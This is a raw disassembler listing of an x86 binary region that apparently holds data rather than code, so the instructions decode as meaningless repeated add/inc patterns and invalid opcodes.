  440234:	add    BYTE PTR [ebp-0x1],al
  440237:	add    BYTE PTR [eax],al
  440239:	das    
  44023a:	inc    DWORD PTR [eax]
  44023c:	add    BYTE PTR [ebx],ch
  44023e:	inc    DWORD PTR [eax]
  440240:	add    BYTE PTR [ecx],ah
  440242:	inc    DWORD PTR [eax]
  440244:	add    BYTE PTR [edi],ah
  440246:	inc    DWORD PTR [eax]
  440248:	add    BYTE PTR [edi],ah
  44024a:	inc    DWORD PTR [eax]
  44024c:	add    BYTE PTR [ecx],ch
  44024e:	inc    DWORD PTR [eax]
  440250:	add    BYTE PTR [ebx],ah
  440252:	inc    DWORD PTR [eax]
  440254:	add    BYTE PTR [edi],bl
  440256:	inc    DWORD PTR [eax]
  440258:	add    BYTE PTR [eax],ch
  44025a:	inc    DWORD PTR [eax]
  44025c:	add    BYTE PTR [eax],ch
  44025e:	inc    DWORD PTR [eax]
  440260:	add    BYTE PTR [eax],ah
  440262:	inc    DWORD PTR [eax]
  440264:	add    BYTE PTR [esi],bl
  440266:	inc    DWORD PTR [eax]
  440268:	add    BYTE PTR [edi],bl
  44026a:	inc    DWORD PTR [eax]
  44026c:	add    BYTE PTR [ebx],ah
  44026e:	inc    DWORD PTR [eax]
  440270:	add    BYTE PTR [ecx],ch
  440272:	inc    DWORD PTR [eax]
  440274:	add    BYTE PTR [edx],dh
  440276:	inc    DWORD PTR [eax]
  440278:	add    BYTE PTR [ebx-0x1],cl
  44027b:	add    BYTE PTR [eax],al
  44027d:	(bad)  
  44027e:	inc    DWORD PTR [eax]
  440280:	add    BYTE PTR [edi+edi*8-0x48fc00],cl
  440287:	or     BYTE PTR [ecx],bh
  440289:	idiv   edi
  44028b:	sbb    edi,DWORD PTR [edi]
  44028d:	fdiv   st(7),st
  44028f:	sbb    eax,0x5ff6a2e
  440294:	sbb    ecx,DWORD PTR [eax-0x1]
  440297:	or     esp,DWORD PTR [edx]
  440299:	jnp    0x44029a
  44029b:	add    BYTE PTR [eax],cl
  44029d:	cwde   
  44029e:	dec    DWORD PTR [ecx]
  4402a0:	pop    ss
  4402a1:	mov    eax,0xad2c0bff
  4402a6:	dec    DWORD PTR [esi]
  4402a8:	sub    DWORD PTR [eax-0x1],edx
  4402ab:	add    BYTE PTR [ebx],dl
  4402ad:	lahf   
  4402ae:	inc    DWORD PTR [eax]
  4402b0:	add    bh,ah
  4402b2:	inc    DWORD PTR [eax]
  4402b4:	add    BYTE PTR [edi+0x6f0000ff],ah
  4402ba:	inc    DWORD PTR [eax]
  4402bc:	add    BYTE PTR [edi+edi*8+0x0],al
  4402c0:	add    BYTE PTR [esi],ah
  4402c2:	inc    DWORD PTR [eax]
  4402c4:	add    BYTE PTR ds:0x1e0000ff,dl
  4402ca:	inc    DWORD PTR [eax]
  4402cc:	add    BYTE PTR [ebx],bl
  4402ce:	inc    DWORD PTR [eax]
  4402d0:	add    BYTE PTR [eax],ah
  4402d2:	inc    DWORD PTR [eax]
  4402d4:	add    BYTE PTR [edi],dl
  4402d6:	inc    DWORD PTR [eax]
  4402d8:	add    BYTE PTR [eax],bl
  4402da:	inc    DWORD PTR [eax]
  4402dc:	add    BYTE PTR ds:0x130000ff,dl
  4402e2:	inc    DWORD PTR [eax]
  4402e4:	add    BYTE PTR [esi],dl
  4402e6:	inc    DWORD PTR [eax]
  4402e8:	add    BYTE PTR [edx],ch
  4402ea:	inc    DWORD PTR [eax]
  4402ec:	add    BYTE PTR [ecx-0x1],al
  4402ef:	add    BYTE PTR [eax],al
  4402f1:	ins    BYTE PTR es:[edi],dx
  4402f2:	inc    DWORD PTR [eax]
  4402f4:	push   es
  4402f5:	mov    ebx,0xd90b02ff
  4402fa:	inc    DWORD PTR [esp+ecx*1]
  4402fd:	mov    ebp,0x51110fff
  440302:	dec    DWORD PTR [edi]
  440304:	adc    DWORD PTR [eax],edi
  440306:	call   DWORD PTR [eax]
  440308:	and    al,0x7e
  44030a:	call   DWORD PTR ds:0x10ff5e22
  440310:	adc    al,0x42
  440312:	dec    DWORD PTR [eax]
  440314:	or     DWORD PTR [ecx],esp
  440316:	dec    DWORD PTR [edx]
  440318:	packsswb mm7,mm7
  44031b:	push   cs
  44031c:	movmskps edi,xmm7
  44031f:	adc    bl,BYTE PTR [eax]
  440321:	inc    esi
  440322:	dec    DWORD PTR [edi]
  440324:	and    BYTE PTR [edi-0x1],ch
  440327:	pop    ss
  440328:	push   ss
  440329:	dec    eax
  44032a:	push   DWORD PTR [eax]
  44032c:	pop    ecx
  44032d:	fdiv   st(7),st
  44032f:	pop    ds
  440330:	dec    ecx
  440331:	idiv   bh
  440333:	add    BYTE PTR [eax],al
  440335:	xchg   ebp,eax
  440336:	inc    DWORD PTR [eax]
  440338:	add    BYTE PTR [edi+edi*8+0x0],bl
  44033c:	add    BYTE PTR [ebx],dh
  44033e:	inc    DWORD PTR [eax]
  440340:	add    BYTE PTR [edi+edi*8],bl
  440343:	add    BYTE PTR [eax],al
  440345:	or     edi,edi
  440347:	add    BYTE PTR [eax],al
  440349:	adc    bh,bh
  44034b:	add    BYTE PTR [eax],al
  44034d:	adc    edi,edi
  44034f:	add    BYTE PTR [eax],al
  440351:	pop    ss
  440352:	inc    DWORD PTR [eax]
  440354:	add    BYTE PTR [eax],dh
  440356:	inc    DWORD PTR [eax]
  440358:	add    BYTE PTR [eax-0x1],dl
  44035b:	add    BYTE PTR [eax],al
  44035d:	cmp    edi,0xffde0100
  440363:	adc    ebp,DWORD PTR [esi]
  440365:	in     eax,dx
  440366:	call   FWORD PTR [ecx]
  440368:	cmp    esp,eax
  44036a:	jmp    DWORD PTR [eax]
  44036c:	dec    ebx
  44036d:	mov    esi,0x95431cff
  440372:	call   DWORD PTR ds:0xff6628
  440378:	or     DWORD PTR [edi-0x3ff3fb01],ebx
  44037e:	dec    DWORD PTR [ecx]
  440380:	punpckhbw mm7,mm7
  440383:	add    BYTE PTR [edx],cl
  440385:	aad    0xff
  440387:	add    eax,0x4ff8404
  44038c:	adc    al,0x5b
  44038e:	dec    DWORD PTR [esi]
  440390:	or     al,0x38
  440392:	call   FWORD PTR [ecx]
  440394:	sbb    DWORD PTR [edi],esi
  440396:	call   FWORD PTR [ebx]
  440398:	cmp    eax,0x1a0affc5
  44039d:	retf   0xff
  4403a0:	add    BYTE PTR [ebp+0x500000ff],al
  4403a6:	inc    DWORD PTR [eax]
  4403a8:	add    BYTE PTR [edx],dh
  4403aa:	inc    DWORD PTR [eax]
  4403ac:	add    BYTE PTR [edi+edi*8],bl
  4403af:	add    BYTE PTR [eax],al
  4403b1:	pop    ss
  4403b2:	inc    DWORD PTR [eax]
  4403b4:	add    BYTE PTR [edi+edi*8],dl
  4403b7:	add    BYTE PTR [eax],al
  4403b9:	sbb    edi,edi
  4403bb:	add    BYTE PTR [eax],al
  4403bd:	das    
  4403be:	inc    DWORD PTR [eax]
  4403c0:	add    BYTE PTR [edi+edi*8],bh
  4403c3:	add    BYTE PTR [edx],al
  4403c5:	arpl   di,di
  4403c7:	add    DWORD PTR ds:0xe03ffb6,ecx
  4403cd:	retf   0x1ff
  4403d0:	psrld  mm7,mm7
  4403d3:	add    BYTE PTR ds:0xffbc,al
  4403d9:	mov    ch,0xff
  4403db:	add    BYTE PTR [esi+eax*8],cl
  4403de:	inc    DWORD PTR [eax]
  4403e0:	or     ecx,ecx
  4403e2:	inc    DWORD PTR [eax]
  4403e4:	adc    esp,ebp
  4403e6:	inc    DWORD PTR [eax]
  4403e8:	sbb    esp,eax
  4403ea:	inc    DWORD PTR [eax]
  4403ec:	adc    al,0xe6
  4403ee:	jmp    FWORD PTR [esi]
  4403f0:	cmp    edi,DWORD PTR [ebx-0x408dbd01]
  4403f6:	call   FWORD PTR [ebx+edi*1]
  4403f9:	mov    cl,0xff
  4403fb:	adc    ebx,DWORD PTR [esi]
  4403fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4403fe:	jmp    FWORD PTR [eax]
  440400:	cmp    DWORD PTR [ebx-0x1],edi
  440403:	xor    eax,0x28ff7438
  440408:	daa    
  440409:	pop    esp
  44040a:	call   DWORD PTR [edi]
  44040c:	sbb    BYTE PTR [ecx-0x1],dl
  44040f:	adc    esp,DWORD PTR [ecx]
  440411:	ins    DWORD PTR es:[edi],dx
  440412:	call   DWORD PTR [esi]
  440414:	and    al,0x6b
  440416:	call   FWORD PTR [ebx]
  440418:	cmp    BYTE PTR [eax-0x3dafde01],bh
  44041e:	call   DWORD PTR ds:0x17ff9132
  440424:	xor    cl,BYTE PTR [ecx-0x12effa01]
  44042a:	inc    DWORD PTR [eax]
  44042c:	add    BYTE PTR [ecx+0x730000ff],dh
  440432:	inc    DWORD PTR [eax]
  440434:	add    BYTE PTR [ecx-0x1],cl
  440437:	add    BYTE PTR [eax],al
  440439:	inc    DWORD PTR cs:[eax]
  44043c:	add    BYTE PTR [ecx],ah
  44043e:	inc    DWORD PTR [eax]
  440440:	add    BYTE PTR [edx],bl
  440442:	inc    DWORD PTR [eax]
  440444:	add    BYTE PTR ds:0x210000ff,ah
  44044a:	inc    DWORD PTR [eax]
  44044c:	add    BYTE PTR [edi],bl
  44044e:	inc    DWORD PTR [eax]
  440450:	add    BYTE PTR [ebx],ah
  440452:	inc    DWORD PTR [eax]
  440454:	add    BYTE PTR [esi],ah
  440456:	inc    DWORD PTR [eax]
  440458:	add    BYTE PTR [ebx],ah
  44045a:	inc    DWORD PTR [eax]
  44045c:	add    BYTE PTR [eax],ah
  44045e:	inc    DWORD PTR [eax]
  440460:	add    BYTE PTR [ecx],ch
  440462:	inc    DWORD PTR [eax]
  440464:	add    BYTE PTR [edi+edi*8],bl
  440467:	add    BYTE PTR [eax],al
  440469:	sub    bh,bh
  44046b:	add    BYTE PTR [eax],al
  44046d:	and    edi,edi
  44046f:	add    BYTE PTR [eax],al
  440471:	pop    ds
  440472:	inc    DWORD PTR [eax]
  440474:	add    BYTE PTR [eax],dh
  440476:	inc    DWORD PTR [eax]
  440478:	add    BYTE PTR [ebp-0x1],cl
  44047b:	add    BYTE PTR [eax],al
  44047d:	pusha  
  44047e:	inc    DWORD PTR [eax]
  440480:	add    BYTE PTR [ecx-0x61ffff01],al
  440486:	inc    DWORD PTR [eax]
  440488:	adc    bh,dl
  44048a:	dec    DWORD PTR [ecx]
  44048c:	sub    dl,ch
  44048e:	call   DWORD PTR [ecx]
  440490:	sub    edx,ebp
  440492:	jmp    DWORD PTR [esi]
  440494:	dec    ecx
  440495:	je     0x440496
  440497:	pop    ss
  440498:	sub    BYTE PTR [ebp-0x1],cl
  44049b:	add    BYTE PTR [esi],dl
  44049d:	inc    edi
  44049e:	dec    DWORD PTR [edi]
  4404a0:	and    ch,BYTE PTR [eax-0x1]
  4404a3:	or     ch,BYTE PTR [eax]
  4404a5:	mov    ds:0x642e0cff,eax
  4404aa:	inc    DWORD PTR [eax]
  4404ac:	pop    es
  4404ad:	mov    esp,0xfd0000ff
  4404b2:	inc    DWORD PTR [eax]
  4404b4:	add    BYTE PTR [esi+0x690000ff],ah
  4404ba:	inc    DWORD PTR [eax]
  4404bc:	add    BYTE PTR [edx-0x1],al
  4404bf:	add    BYTE PTR [eax],al
  4404c1:	daa    
  4404c2:	inc    DWORD PTR [eax]
  4404c4:	add    BYTE PTR [ecx],bl
  4404c6:	inc    DWORD PTR [eax]
  4404c8:	add    BYTE PTR [edi+edi*8],dl
  4404cb:	add    BYTE PTR [eax],al
  4404cd:	sbb    al,0xff
  4404cf:	add    BYTE PTR [eax],al
  4404d1:	sbb    edi,edi
  4404d3:	add    BYTE PTR [eax],al
  4404d5:	sbb    al,0xff
  4404d7:	add    BYTE PTR [eax],al
  4404d9:	and    bh,bh
  4404db:	add    BYTE PTR [eax],al
  4404dd:	push   ss
  4404de:	inc    DWORD PTR [eax]
  4404e0:	add    BYTE PTR [edi],dl
  4404e2:	inc    DWORD PTR [eax]
  4404e4:	add    BYTE PTR ds:0x200000ff,dl
  4404ea:	inc    DWORD PTR [eax]
  4404ec:	add    BYTE PTR [edi],bh
  4404ee:	inc    DWORD PTR [eax]
  4404f0:	add    BYTE PTR [eax-0x1],ch
  4404f3:	add    BYTE PTR [ebp*4-0x2af4fd01],al
  4404fa:	inc    DWORD PTR ds:0x14ffc80f
  440500:	sbb    ebx,DWORD PTR [edi+edi*8+0x11]
  440504:	adc    al,0x31
  440506:	jmp    DWORD PTR [edx]
  440508:	dec    esp
  440509:	mov    ebx,0x982712ff
  44050e:	call   FWORD PTR [edx]
  440510:	cs jae 0x440512
  440513:	or     cl,BYTE PTR [edi]
  440515:	inc    edi
  440516:	dec    DWORD PTR ds:0xeff4011
  44051c:	or     ah,BYTE PTR [ebx]
  44051e:	dec    DWORD PTR [esi]
  440520:	rdmsr  
  440522:	dec    DWORD PTR [edi]
  440524:	pop    ss
  440525:	dec    edi
  440526:	call   FWORD PTR ds:0x1bff411a
  44052c:	sub    ebx,eax
  44052e:	jmp    FWORD PTR [eax]
  440530:	push   esi
  440531:	stc    
  440532:	inc    DWORD PTR [eax]
  440534:	add    BYTE PTR [edx+0x620000ff],bl
  44053a:	inc    DWORD PTR [eax]
  44053c:	add    BYTE PTR [esi],dh
  44053e:	inc    DWORD PTR [eax]
  440540:	add    BYTE PTR [eax],ah
  440542:	inc    DWORD PTR [eax]
  440544:	add    BYTE PTR [eax],dl
  440546:	inc    DWORD PTR [eax]
  440548:	add    BYTE PTR [esi],cl
  44054a:	inc    DWORD PTR [eax]
  44054c:	add    BYTE PTR [edx],dl
  44054e:	inc    DWORD PTR [eax]
  440550:	add    BYTE PTR ds:0x300000ff,dl
  440556:	inc    DWORD PTR [eax]
  440558:	add    BYTE PTR [ebp-0x1],dl
  44055b:	add    BYTE PTR [eax],al
  44055d:	cmp    edi,0xffde0000
  440563:	add    eax,0x5ffc615
  440568:	add    eax,0x1e0bffe2
  44056d:	jecxz  0x44056e
  44056f:	push   cs
  440570:	cmp    BYTE PTR [edi-0x60d8f301],bh
  440576:	inc    DWORD PTR [edi]
  440578:	add    eax,0x900ff5a
  44057d:	ja     0x44057e
  44057f:	add    BYTE PTR [edx],cl
  440581:	ret    0xff
  440584:	or     bh,BYTE PTR [eax+0x640309ff]
  44058a:	call   FWORD PTR [ebx]
  44058c:	sub    DWORD PTR [esi-0x1],esp
  44058f:	sbb    esi,DWORD PTR [eax]
  440591:	cmp    edi,0xff3a1c18
  440597:	push   ds
  440598:	inc    eax
  440599:	mov    esi,0xc41406ff
  44059e:	inc    DWORD PTR [eax]
  4405a0:	add    BYTE PTR [edi+edi*8-0xad0000],al
  4405a7:	add    BYTE PTR [eax],al
  4405a9:	xor    bh,bh
  4405ab:	add    BYTE PTR [eax],al
  4405ad:	pop    ss
  4405ae:	inc    DWORD PTR [eax]
  4405b0:	add    BYTE PTR [edx],dl
  4405b2:	inc    DWORD PTR [eax]
  4405b4:	add    BYTE PTR [esi],dl
  4405b6:	inc    DWORD PTR [eax]
  4405b8:	add    BYTE PTR [edx],bl
  4405ba:	inc    DWORD PTR [eax]
  4405bc:	add    BYTE PTR [edi],ch
  4405be:	inc    DWORD PTR [eax]
  4405c0:	add    BYTE PTR [edx-0x1],al
  4405c3:	add    BYTE PTR [esp+eax*4],al
  4405c6:	inc    DWORD PTR [eax]
  4405c8:	sbb    dh,al
  4405ca:	inc    DWORD PTR [edi]
  4405cc:	push   ds
  4405cd:	jmp    0x4405ce
  4405cf:	add    BYTE PTR [ebx],dl
  4405d1:	out    0xff,eax
  4405d3:	sbb    al,0x3f
  4405d5:	repnz call FWORD PTR [edi]
  4405d8:	das    
  4405d9:	loope  0x4405da
  4405db:	sub    cl,BYTE PTR [edi+ebp*8-0x1]
  4405df:	and    eax,DWORD PTR [esi-0xc]
  4405e2:	call   DWORD PTR [esi]
  4405e4:	das    
  4405e5:	idiv   edi
  4405e7:	sub    BYTE PTR [ecx],bh
  4405e9:	into   
  4405ea:	inc    DWORD PTR [ebx]
  4405ec:	cmp    bh,dh
  4405ee:	inc    DWORD PTR [eax]
  4405f0:	sbb    ah,dh
  4405f2:	(bad)  
  4405f3:	ds dec edx
  4405f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4405f6:	push   DWORD PTR [ebx]
  4405f8:	bound  edi,QWORD PTR [edi+edi*8-0x5dfe00]
  4405ff:	add    al,0xc
  440601:	stos   BYTE PTR es:[edi],al
  440602:	push   DWORD PTR [ecx]
  440604:	xor    DWORD PTR [edi+edi*8+0x36],esp
  440608:	cmp    BYTE PTR [ecx-0x1],bh
  44060b:	sbb    esp,DWORD PTR [eax]
  44060d:	ins    DWORD PTR es:[edi],dx
  44060e:	call   DWORD PTR [eax]
  440610:	and    DWORD PTR [edi+edi*8+0x17],esi
  440614:	es imul edi,edi,0xff561f15
  44061b:	sbb    edi,DWORD PTR [ecx+ebp*4]
  44061e:	call   FWORD PTR [ecx]
  440620:	xor    bl,BYTE PTR [ebp+0x692712ff]
  440626:	inc    DWORD PTR [esi]
  440628:	push   ds
  440629:	loop   0x44062a
  44062b:	add    BYTE PTR [ecx],al
  44062d:	lods   eax,DWORD PTR ds:[esi]
  44062e:	inc    DWORD PTR [eax]
  440630:	add    BYTE PTR [ecx-0x1],dh
  440633:	add    BYTE PTR [eax],al
  440635:	push   eax
  440636:	inc    DWORD PTR [eax]
  440638:	add    BYTE PTR [ebx],bh
  44063a:	inc    DWORD PTR [eax]
  44063c:	add    BYTE PTR [ebx],ch
  44063e:	inc    DWORD PTR [eax]
  440640:	add    BYTE PTR [edx],ah
  440642:	inc    DWORD PTR [eax]
  440644:	add    BYTE PTR [esi],bl
  440646:	inc    DWORD PTR [eax]
  440648:	add    BYTE PTR ds:0x1a0000ff,bl
  44064e:	inc    DWORD PTR [eax]
  440650:	add    BYTE PTR [ebx],ah
  440652:	inc    DWORD PTR [eax]
  440654:	add    BYTE PTR [edi],dl
  440656:	inc    DWORD PTR [eax]
  440658:	add    BYTE PTR [edi],bl
  44065a:	inc    DWORD PTR [eax]
  44065c:	add    BYTE PTR [edi],bl
  44065e:	inc    DWORD PTR [eax]
  440660:	add    BYTE PTR [edx],ah
  440662:	inc    DWORD PTR [eax]
  440664:	add    BYTE PTR [eax],ah
  440666:	inc    DWORD PTR [eax]
  440668:	add    BYTE PTR ds:0x270000ff,ah
  44066e:	inc    DWORD PTR [eax]
  440670:	add    BYTE PTR ds:0x430000ff,dh
  440676:	inc    DWORD PTR [eax]
  440678:	add    BYTE PTR [eax-0x1],dl
  44067b:	add    BYTE PTR [eax],al
  44067d:	push   0xffffffff
  44067f:	add    BYTE PTR [eax],al
  440681:	xchg   bh,bh
  440683:	add    BYTE PTR [eax],al
  440685:	fwait
  440686:	inc    DWORD PTR [eax]
  440688:	add    BYTE PTR [eax-0x3bf7fd01],bh
  44068e:	inc    DWORD PTR [ecx]
  440690:	adc    esp,ebx
  440692:	call   DWORD PTR [edx]
  440694:	das    
  440695:	idiv   edi
  440697:	es inc ebx
  440699:	mov    edi,?
  44069b:	sbb    ch,BYTE PTR [ecx]
  44069d:	dec    edi
  44069e:	jmp    DWORD PTR [ecx]
  4406a0:	cmp    DWORD PTR [ebp-0x1],edi
  4406a3:	and    eax,0x1ff613d
  4406a8:	push   es
  4406a9:	fwait
  4406aa:	inc    DWORD PTR [ecx]
  4406ac:	add    al,dh
  4406ae:	inc    DWORD PTR [eax]
  4406b0:	add    bh,dh
  4406b2:	inc    DWORD PTR [eax]
  4406b4:	add    BYTE PTR [ebx+0x670000ff],ah
  4406ba:	inc    DWORD PTR [eax]
  4406bc:	add    BYTE PTR [ebx-0x1],al
  4406bf:	add    BYTE PTR [eax],al
  4406c1:	and    eax,0x1d0000ff
  4406c6:	inc    DWORD PTR [eax]
  4406c8:	add    BYTE PTR [edx],bl
  4406ca:	inc    DWORD PTR [eax]
  4406cc:	add    BYTE PTR [ebx],bl
  4406ce:	inc    DWORD PTR [eax]
  4406d0:	add    BYTE PTR [esi],dl
  4406d2:	inc    DWORD PTR [eax]
  4406d4:	add    BYTE PTR [eax],bl
  4406d6:	inc    DWORD PTR [eax]
  4406d8:	add    BYTE PTR ds:0x180000ff,bl
  4406de:	inc    DWORD PTR [eax]
  4406e0:	add    BYTE PTR ds:0x1b0000ff,dl
  4406e6:	inc    DWORD PTR [eax]
  4406e8:	add    BYTE PTR ds:0x410000ff,ch
  4406ee:	inc    DWORD PTR [eax]
  4406f0:	add    BYTE PTR [ebx-0x1],ah
  4406f3:	add    BYTE PTR ds:0xd01ffaf,al
  4406f9:	fcos   
  4406fb:	or     DWORD PTR [ebx],edx
  4406fd:	mov    esp,0xa53719ff
  440702:	dec    DWORD PTR [edi]
  440704:	sbb    BYTE PTR [eax-0x1],ah
  440707:	sbb    eax,0x1dff6b25
  44070c:	aaa    
  44070d:	(bad)  
  44070e:	call   DWORD PTR [ebx]
  440710:	das    
  440711:	lods   al,BYTE PTR ds:[esi]
  440712:	dec    DWORD PTR [ecx]
  440714:	adc    eax,0x1b0dff55
  440719:	pop    esi
  44071a:	dec    DWORD PTR [ecx]
  44071c:	add    ebx,DWORD PTR [edi+edi*8]
  44071f:	or     al,BYTE PTR [esi]
  440721:	and    bh,bh
  440723:	or     edx,DWORD PTR [ebx]
  440725:	dec    esi
  440726:	call   FWORD PTR [edx]
  440728:	adc    al,0x34
  44072a:	call   FWORD PTR [edi]
  44072c:	cmp    ah,bh
  44072e:	jmp    FWORD PTR [eax]
  440730:	push   ecx
  440731:	cli    
  440732:	inc    DWORD PTR [eax]
  440734:	add    BYTE PTR [edx+0x5d0000ff],bl
  44073a:	inc    DWORD PTR [eax]
  44073c:	add    BYTE PTR ds:0x1e0000ff,dh
  440742:	inc    DWORD PTR [eax]
  440744:	add    BYTE PTR [ebx],cl
  440746:	inc    DWORD PTR [eax]
  440748:	add    BYTE PTR ds:0xf0000ff,cl
  44074e:	inc    DWORD PTR [eax]
  440750:	add    BYTE PTR [eax],bl
  440752:	inc    DWORD PTR [eax]
  440754:	add    BYTE PTR ds:0x520000ff,ch
  44075a:	inc    DWORD PTR [eax]
  44075c:	add    BYTE PTR [ecx-0x3dffff01],al
  440762:	dec    DWORD PTR [edx]
  440764:	push   ds
  440765:	clc    
  440766:	dec    DWORD PTR ds:0x4ffec21
  44076c:	add    al,0xec
  44076e:	inc    DWORD PTR [ecx]
  440770:	pop    es
  440771:	loope  0x440772
  440773:	add    DWORD PTR [ecx],ebx
  440775:	mov    ch,0xff
  440777:	adc    BYTE PTR [eax],ch
  440779:	push   0xffffffff
  44077b:	and    ah,BYTE PTR [edx]
  44077d:	xor    bh,bh
  44077f:	cmp    DWORD PTR ds:0x1315ff73,edi
  440785:	mov    edx,0x812125ff
  44078a:	jmp    DWORD PTR [eax+edi*1]
  44078d:	cdq    
  44078e:	call   DWORD PTR [edi]
  440790:	and    al,0x64
  440792:	call   FWORD PTR [edi]
  440794:	sub    BYTE PTR [esi-0x1],al
  440797:	sbb    al,0x46
  440799:	sar    edi,1
  44079b:	add    edx,DWORD PTR [ebx]
  44079d:	int    0xff
  44079f:	add    BYTE PTR [eax],al
  4407a1:	test   bh,bh
  4407a3:	add    BYTE PTR [eax],al
  4407a5:	push   esp
  4407a6:	inc    DWORD PTR [eax]
  4407a8:	add    BYTE PTR [ecx],dh
  4407aa:	inc    DWORD PTR [eax]
  4407ac:	add    BYTE PTR [edi+edi*8],bl
  4407af:	add    BYTE PTR [eax],al
  4407b1:	adc    al,0xff
  4407b3:	add    BYTE PTR [eax],al
  4407b5:	push   ss
  4407b6:	inc    DWORD PTR [eax]
  4407b8:	add    BYTE PTR [edi+edi*8],bl
  4407bb:	add    BYTE PTR [eax],al
  4407bd:	sub    edi,edi
  4407bf:	add    BYTE PTR [eax],al
  4407c1:	inc    ebp
  4407c2:	inc    DWORD PTR [eax]
  4407c4:	add    DWORD PTR [esi-0x1],ebp
  4407c7:	add    eax,DWORD PTR [edx+eiz*8]
  4407ca:	dec    DWORD PTR [edx]
  4407cc:	call   0xfff7:0x4000fffc
  4407d3:	xor    eax,0x53ffee98
  4407d8:	imul   esp,DWORD PTR [edi-0x7bacb001],0xffffffff
  4407df:	daa    
  4407e0:	and    al,0x3e
  4407e2:	jmp    FWORD PTR [eax]
  4407e4:	sub    DWORD PTR [ebx-0x1],edx
  4407e7:	aaa    
  4407e8:	sub    al,0x4b
  4407ea:	jmp    FWORD PTR [ecx]
  4407ec:	cmp    DWORD PTR [ecx-0x1fdaee01],ebx
  4407f2:	jmp    FWORD PTR [eax]
  4407f4:	and    bl,BYTE PTR [edi-0x5cb3c901]
  4407fa:	inc    DWORD PTR [esi]
  4407fc:	and    al,0x75
  4407fe:	call   DWORD PTR [ecx]
  440800:	adc    al,0x46
  440802:	push   DWORD PTR [ebx]
  440804:	sub    eax,0x3a37ff68
  440809:	ja     0x44080a
  44080b:	sub    ch,BYTE PTR [esi]
  44080d:	jle    0x44080e
  44080f:	sbb    al,0x28
  440811:	(bad)  
  440812:	call   DWORD PTR [esi]
  440814:	das    
  440815:	mov    ?,edi
  440817:	(bad)  
  440819:	outs   dx,DWORD PTR ds:[esi]
  44081a:	dec    DWORD PTR [ecx+ebx*1]
  44081d:	pop    ecx
  44081e:	call   DWORD PTR [ebx]
  440820:	and    esi,DWORD PTR [ecx-0x1]
  440823:	adc    al,0x2d
  440825:	outs   dx,DWORD PTR ds:[esi]
  440826:	dec    DWORD PTR [edx]
  440828:	and    dl,ch
  44082a:	inc    DWORD PTR [eax]
  44082c:	add    DWORD PTR [eax+0x690000ff],ebp
  440832:	inc    DWORD PTR [eax]
  440834:	add    BYTE PTR [edx-0x1],al
  440837:	add    BYTE PTR [eax],al
  440839:	sub    al,0xff
  44083b:	add    BYTE PTR [eax],al
  44083d:	and    bh,bh
  44083f:	add    BYTE PTR [eax],al
  440841:	inc    DWORD PTR es:[eax]
  440844:	add    BYTE PTR [edi+edi*8],ah
  440847:	add    BYTE PTR [eax],al
  440849:	sbb    edi,edi
  44084b:	add    BYTE PTR [eax],al
  44084d:	and    edi,edi
  44084f:	add    BYTE PTR [eax],al
  440851:	sub    al,0xff
  440853:	add    BYTE PTR [eax],al
  440855:	and    edi,edi
  440857:	add    BYTE PTR [eax],al
  440859:	pop    ss
  44085a:	inc    DWORD PTR [eax]
  44085c:	add    BYTE PTR [esi],bl
  44085e:	inc    DWORD PTR [eax]
  440860:	add    BYTE PTR [ecx],ah
  440862:	inc    DWORD PTR [eax]
  440864:	add    BYTE PTR ds:0x210000ff,bl
  44086a:	inc    DWORD PTR [eax]
  44086c:	add    BYTE PTR [edi],ah
  44086e:	inc    DWORD PTR [eax]
  440870:	add    BYTE PTR [ebx],bh
  440872:	inc    DWORD PTR [eax]
  440874:	add    BYTE PTR [edi+edi*8+0x0],dl
  440878:	or     eax,0xc01ff9f
  44087d:	fwait
  44087e:	inc    DWORD PTR [eax]
  440880:	add    BYTE PTR [ebx-0x4efcff01],bl
  440886:	inc    DWORD PTR [eax]
  440888:	add    BYTE PTR [edi-0x3bffff01],dh
  44088e:	inc    DWORD PTR [eax]
  440890:	add    bh,al
  440892:	inc    DWORD PTR [eax]
  440894:	add    dh,ch
  440896:	inc    DWORD PTR [edi+edx*1]
  440899:	stc    
  44089a:	dec    DWORD PTR ds:0x15ff8021
  4408a0:	cs pop ebp
  4408a2:	call   FWORD PTR [ecx]
  4408a4:	sub    DWORD PTR [ebp-0x1],edi
  4408a7:	add    BYTE PTR [eax],al
  4408a9:	loopne 0x4408aa
  4408ab:	add    BYTE PTR [eax],al
  4408ad:	cmc    
  4408ae:	inc    DWORD PTR [eax]
  4408b0:	add    ch,ch
  4408b2:	inc    DWORD PTR [eax]
  4408b4:	add    BYTE PTR [ebp+0x660000ff],bl
  4408ba:	inc    DWORD PTR [eax]
  4408bc:	add    BYTE PTR [edi+edi*8+0x0],al
  4408c0:	add    BYTE PTR [esi],ah
  4408c2:	inc    DWORD PTR [eax]
  4408c4:	add    BYTE PTR [edx],bl
  4408c6:	inc    DWORD PTR [eax]
  4408c8:	add    BYTE PTR [eax],bl
  4408ca:	inc    DWORD PTR [eax]
  4408cc:	add    BYTE PTR [eax],bl
  4408ce:	inc    DWORD PTR [eax]
  4408d0:	add    BYTE PTR [edi+edi*8],dl
  4408d3:	add    BYTE PTR [eax],al
  4408d5:	pop    ss
  4408d6:	inc    DWORD PTR [eax]
  4408d8:	add    BYTE PTR [edi],bl
  4408da:	inc    DWORD PTR [eax]
  4408dc:	add    BYTE PTR [edx],dl
  4408de:	inc    DWORD PTR [eax]
  4408e0:	add    BYTE PTR [ecx],dl
  4408e2:	inc    DWORD PTR [eax]
  4408e4:	add    BYTE PTR [eax],bl
  4408e6:	inc    DWORD PTR [eax]
  4408e8:	add    BYTE PTR [eax],ch
  4408ea:	inc    DWORD PTR [eax]
  4408ec:	add    BYTE PTR [eax],bh
  4408ee:	inc    DWORD PTR [eax]
  4408f0:	add    BYTE PTR [ecx-0x1],ah
  4408f3:	add    BYTE PTR ds:0xb01ffae,al
  4408f9:	aam    0xff
  4408fb:	or     bl,BYTE PTR ds:0x3b19ffc0
  440901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440902:	dec    DWORD PTR [edi]
  440904:	push   ds
  440905:	jns    0x440906
  440907:	or     dl,BYTE PTR [edi]
  440909:	push   eax
  44090a:	dec    DWORD PTR [ebx]
  44090c:	sbb    BYTE PTR [ebp-0x1],cl
  44090f:	push   es
  440910:	adc    eax,eax
  440912:	dec    DWORD PTR [ebx]
  440914:	sbb    BYTE PTR [edi+edi*8+0x8],cl
  440918:	sbb    cl,BYTE PTR [ebp-0x1]
  44091b:	adc    eax,0x1fff7c24
  440920:	sbb    edi,DWORD PTR [edi]
